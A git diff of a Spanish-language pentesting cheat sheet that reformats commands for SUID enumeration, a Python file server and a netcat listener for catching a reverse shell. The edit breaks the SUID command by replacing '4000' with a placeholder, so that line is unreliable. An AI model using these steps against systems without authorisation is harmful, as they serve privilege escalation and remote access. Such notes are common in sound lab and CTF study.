@@ -4,10 +4,12 @@
 ## Linux Commands
 ### FIND
 Listar los permisos SUID:
-> find  \-perm -4000 2>/dev/null
+
+``` find  \-perm -4<PERMISOS> 2>/dev/null ```
 ### Python
 Crear un servidor de python en mi máquina local:
-> python3 -m http.server <PORT>
+
+``` python3 -m http.server <PORT> ```
 ### Reverse Shell
 Se debe ejecutar en la máquina local primero alguna herramienta para poner en escucha el <PORT>,
 como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```
